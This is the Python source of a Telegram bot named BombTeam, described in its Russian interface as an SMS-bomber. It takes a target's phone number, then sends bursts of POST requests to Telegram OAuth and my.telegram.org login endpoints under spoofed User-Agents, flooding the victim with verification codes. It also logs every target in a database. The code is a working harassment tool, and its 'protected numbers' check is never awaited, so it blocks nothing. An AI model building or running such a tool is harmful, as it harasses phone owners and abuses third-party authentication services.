import asyncio
import aiohttp
from datetime import datetime, timedelta
from fake_useragent import UserAgent
from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
import sqlite3
import threading
import logging
from os import getenv

logging.basicConfig(level=logging.INFO)

# Инициализация бота
API_TOKEN = getenv('API_TOKEN')
CHANNEL_ID = getenv('CHANNEL_ID')
CHANNEL_LINK = getenv('CHANNEL_LINK')
SECURE_PHONE = [phone.strip() for phone in getenv("SECURE_PHONES", '').split(',') if phone.strip()]

bot_properties = DefaultBotProperties(parse_mode=ParseMode.HTML)

bot = Bot(token=API_TOKEN, default=bot_properties)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

conn = sqlite3.connect('BombTeam.db')
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, 
                   total_requests INTEGER DEFAULT 0, last_request_time TIMESTAMP)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS requests
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT, 
                   timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, cycles INTEGER)''')

conn.commit()


class BomberStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_cycles = State()
    waiting_for_message = State()


BOMBER_URLS = [
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&embed=1&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2F',
    'https://oauth.telegram.org/auth/request?bot_id=6358004204&origin=https%3A%2F%2Fbotconsole.net&embed=1&return_to=https%3A%2F%2Fbotconsole.net%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=6495179803&origin=https%3A%2F%2Fbrand.tgads.com&embed=1&return_to=https%3A%2F%2Fbrand.tgads.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&return_to=https%3A%2F%2Fbot-t.com%2Flogin&embed=1'
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&embed=1&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2F',
    'https://oauth.telegram.org/auth/request?bot_id=6358004204&origin=https%3A%2F%2Fbotconsole.net&embed=1&return_to=https%3A%2F%2Fbotconsole.net%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=6495179803&origin=https%3A%2F%2Fbrand.tgads.com&embed=1&return_to=https%3A%2F%2Fbrand.tgads.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&return_to=https%3A%2F%2Fbot-t.com%2Flogin&embed=1'
]

BACKUP_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&embed=1&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2F',
    'https://oauth.telegram.org/auth/request?bot_id=6358004204&origin=https%3A%2F%2Fbotconsole.net&embed=1&return_to=https%3A%2F%2Fbotconsole.net%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=6495179803&origin=https%3A%2F%2Fbrand.tgads.com&embed=1&return_to=https%3A%2F%2Fbrand.tgads.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&return_to=https%3A%2F%2Fbot-t.com%2Flogin&embed=1'
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&embed=1&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2F',
    'https://oauth.telegram.org/auth/request?bot_id=6358004204&origin=https%3A%2F%2Fbotconsole.net&embed=1&return_to=https%3A%2F%2Fbotconsole.net%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=6495179803&origin=https%3A%2F%2Fbrand.tgads.com&embed=1&return_to=https%3A%2F%2Fbrand.tgads.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&return_to=https%3A%2F%2Fbot-t.com%2Flogin&embed=1'
]


async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logging.error(f"Failed to check subscription for user {user_id}. Error: {str(e)}")
        return False


@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name

    cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, last_name) VALUES (?, ?, ?, ?)',
                   (user_id, username, first_name, last_name))
    conn.commit()

    is_subscribed = await check_subscription(user_id)

    if is_subscribed:
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🔥 Начать атаку", callback_data="start_attack"),
                InlineKeyboardButton(text="📊 Моя статистика", callback_data="my_stats"),
            ],
            [
                InlineKeyboardButton(text="ℹ️ Информация", callback_data="info"),
                InlineKeyboardButton(text="💬 Поддержка", url=CHANNEL_LINK),
            ]
        ])


        await message.answer(
            f"👋 Привет, {first_name}!\n\n"
            "Добро пожаловать в <b>BombTeam</b> - мощный SMS-бомбер для Telegram.\n\n"
            "Выберите действие:",
            reply_markup=markup
        )
    else:
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_subscription")]
        ])


        await message.answer(
            "📛 Для использования бота необходимо подписаться на наш канал!\n\n"
            "После подписки нажмите кнопку ниже:",
            reply_markup=markup
        )

@dp.callback_query(F.data == 'check_subscription')
async def process_check_subscription(callback_query: types.CallbackQuery):
    is_subscribed = await check_subscription(callback_query.from_user.id)

    if is_subscribed:
        await callback_query.message.delete()
        await cmd_start(callback_query.message)
    else:
        await bot.answer_callback_query(
            callback_query.id,
            "❌ Вы не подписаны на канал!",
            show_alert=True
        )

@dp.callback_query(F.data == 'my_stats')
async def process_my_stats(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    cursor.execute('SELECT total_requests FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()

    if result:
        total_requests = result[0]

        cursor.execute(
            'SELECT phone, timestamp, cycles FROM requests WHERE user_id = ? ORDER BY timestamp DESC LIMIT 5',
            (user_id,))
        last_requests = cursor.fetchall()

        stats_text = f"📊 <b>Ваша статистика:</b>\n\n"
        stats_text += f"🔢 Всего запросов: <b>{total_requests}</b>\n\n"
        stats_text += "⏳ <b>Последние атаки:</b>\n"

        for i, req in enumerate(last_requests, 1):
            phone, timestamp, cycles = req
            stats_text += f"{i}. Номер: <code>{phone}</code>\n   Циклов: {cycles}\n   Время: {timestamp}\n\n"

        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
        ])


        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=stats_text,
            reply_markup=markup
        )
    else:
        await bot.answer_callback_query(
            callback_query.id,
            "❌ Статистика не найдена!",
            show_alert=True
        )

@dp.callback_query(F.data == 'start_attack')
async def process_start_attack(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id

    cursor.execute('SELECT last_request_time FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()

    if result and result[0]:
        last_request_time = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        cooldown_end = last_request_time + timedelta(minutes=1)

        if datetime.now() < cooldown_end:
            time_left = cooldown_end - datetime.now()
            minutes_left = int(time_left.total_seconds() // 60)

            await bot.answer_callback_query(
                callback_query.id,
                f"⏳ До следующей атаки осталось: {minutes_left} минут",
                show_alert=True
            )
            return

    await state.set_state(BomberStates.waiting_for_phone)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Отмена", callback_data="back_to_menu")]
    ])

    await bot.edit_message_text(
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        text="📱 Введите номер телефона в международном формате (например: +79991234567):",
        reply_markup=markup
    )


@dp.message(StateFilter(BomberStates.waiting_for_phone))
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()

    if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 10:
        await message.answer(
            "❌ Неверный формат номера! Введите номер в международном формате (например: +79991234567):")
        return


    async def check_phone(secure_phone: list):
        for sec_phone in secure_phone:
            if phone == sec_phone:
                await message.answer("❌ Доступ запрещен!")
    check_phone(SECURE_PHONE)
    await state.update_data(phone=phone)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Отмена", callback_data="back_to_menu")]
    ])

    await state.set_state(BomberStates.waiting_for_cycles)
    await message.answer(
        "🔢 Введите количество циклов атаки (рекомендуется 1):",
        reply_markup=markup
    )


@dp.message(StateFilter(BomberStates.waiting_for_cycles))
async def process_cycles(message: types.Message, state: FSMContext):
    try:
        cycles = int(message.text.strip())

        if cycles < 1 or cycles > 2:
            await message.answer("❌ Количество циклов должно быть от 1 до 2!")
            return

        await state.update_data(cycles=cycles)

        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Отмена", callback_data="back_to_menu")]
        ])

        await state.set_state(BomberStates.waiting_for_message)
        await message.answer(
            "✏️ Введите [-] для подтверждения:",
            reply_markup=markup
        )
    except ValueError:
        await message.answer("❌ Введите число от 1 до 2!")


@dp.message(StateFilter(BomberStates.waiting_for_message))
async def process_message(message: types.Message, state: FSMContext):
    user_message = message.text.strip()
    if user_message == '-':
        user_message = "FDCLOWN"

    user_data = await state.get_data()
    phone = user_data['phone']
    cycles = user_data['cycles']

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute('UPDATE users SET last_request_time = ?, total_requests = total_requests + 1 WHERE user_id = ?',
                   (now, message.from_user.id))
    cursor.execute('INSERT INTO requests (user_id, phone, cycles) VALUES (?, ?, ?)',
                   (message.from_user.id, phone, cycles))
    conn.commit()

    await state.clear()

    thread = threading.Thread(target=lambda: asyncio.run(
        run_attack(message.from_user.id, phone, cycles, user_message)))
    thread.daemon = True
    thread.start()

    await message.answer(
        f"🚀 Атака начата на номер <code>{phone}</code>\n"
        f"🔁 Циклов: <b>{cycles}</b>\n"
        "⏳ Запросы будут отправлены в течение 1 минуты",
    )

async def run_attack(user_id, phone, cycles, message_text):
    try:
        ua = UserAgent()
        headers = {'User-Agent': ua.random}

        success_count = 0

        async with aiohttp.ClientSession() as session:
            for cycle in range(cycles):
                current_urls = BOMBER_URLS if cycle % 2 == 0 else BACKUP_URLS[:10]

                tasks = []
                for url in current_urls:
                    task = asyncio.create_task(send_request(session, url, headers, phone, message_text))
                    tasks.append(task)

                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count += sum(1 for r in results if r is True)

                await asyncio.sleep(1)

        await bot.send_message(
            user_id,
            f"✅ Атака завершена!\n\n"
            f"📱 Номер: <code>{phone}</code>\n"
            f"🔁 Циклов: <b>{cycles}</b>\n"
            f"📊 Успешных запросов: <b>{success_count}</b>",
        )
    except Exception as e:
        logging.exception("Error during attack:")
        await bot.send_message(user_id, f"❌ Ошибка при выполнении атаки: {str(e)}")

async def send_request(session, url, headers, phone, message_text):
    try:
        data = {
            'phone': phone,
            'message': message_text
        }

        async with session.post(url, headers=headers, data=data, timeout=10) as response:
            return response.status == 200
    except aiohttp.ClientError as e:
        logging.warning(f"Request to {url} failed: {e}")
        return False
    except Exception as e:
         logging.exception(f"General error in send_request to {url}")
         return False

@dp.callback_query(F.data == 'back_to_menu', StateFilter(None))
async def process_back_to_menu(callback_query: types.CallbackQuery, state: FSMContext):
     await state.clear()
     await cmd_start(callback_query.message)

@dp.callback_query(F.data == 'info')
async def process_info(callback_query: types.CallbackQuery):
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
    ])

    await bot.edit_message_text(
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        text="ℹ️ <b>Информация о BombTeam</b>\n\n"
             "🔹 <b>BombTeam</b> - мощный SMS-бомбер для Telegram\n"
             "🔹 Поддержка 17 сервисов (10 активных одновременно)\n"
             "🔹 Возможность настройки количества циклов\n"
             "🔹 Встроенная защита от спама (cooldown 1 мин)\n"
             "🔹 Подробная статистика атак\n\n"
             "📢 <b>Канал разработчика:</b> @N2OTeaM\n"
             "👨‍💻 <b>Поддержка:</b> @N2OTeaM",
        reply_markup=markup,
    )

async def main():
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()

if __name__ == '__main__':
    asyncio.run(main())